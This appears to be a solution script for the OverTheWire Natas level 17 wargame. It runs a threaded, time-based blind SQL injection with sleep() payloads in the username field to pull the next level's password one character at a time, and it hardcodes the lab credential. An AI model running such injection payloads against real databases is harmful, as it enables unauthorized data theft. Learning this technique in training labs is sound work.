#!/usr/bin python

import time
import string
import requests
from requests.auth import HTTPBasicAuth
import concurrent.futures

start_script = time.perf_counter()
all_chars = list(string.ascii_uppercase + string.ascii_lowercase + string.digits)
natas17_password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
natas18_password = ""
filtered_chars = ""
sleep_time = 1

def get_chars(char):
    data = {'username': 'natas18" and password LIKE BINARY "%' + char + '%" and sleep(' + str(sleep_time) + ') #'}

    attack_start = time.perf_counter()
    req = requests.post('http://natas17.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas17', natas17_password), data=data)
    attack_end = time.perf_counter()
    attack_time = round(attack_end-attack_start, 2)

    if attack_time > 1:
        return char
    else:
        return None

start_filter = time.perf_counter()

with concurrent.futures.ThreadPoolExecutor() as executor:
    result = executor.map(get_chars, all_chars)

    for r in result:
        if r is not None:
            print(r, end='', flush=True)
            filtered_chars = filtered_chars + str(r)

end_filter = time.perf_counter()
print(f'\nFiltering completed in {round(end_filter - start_filter, 3)} seconds')


def get_password(fc):
    data = {'username': 'natas18" and password LIKE BINARY "' + natas18_password + str(fc) + '%" and sleep(' + str(sleep_time) + ') #'}

    attack_start = time.perf_counter()
    req = requests.post('http://natas17.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas17', natas17_password), data=data)

    attack_end= time.perf_counter()
    attack_time = round(attack_end - attack_start, 2)

    if attack_time > 1:
        return str(fc)
    else:
        return None

start_password = time.perf_counter()

for _ in range(0,32):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        result = executor.map(get_password, filtered_chars)

        for r in result:
            if r is not None:
                natas18_password = natas18_password + str(r)
                print(r, end='', flush=True)

end_password = time.perf_counter()

print(f'\nPassword search completed in {round(end_password - start_password, 2)} seconds')

end_script = time.perf_counter()
print(f'\nCompleted in {round(end_script - start_script, 2)} seconds')
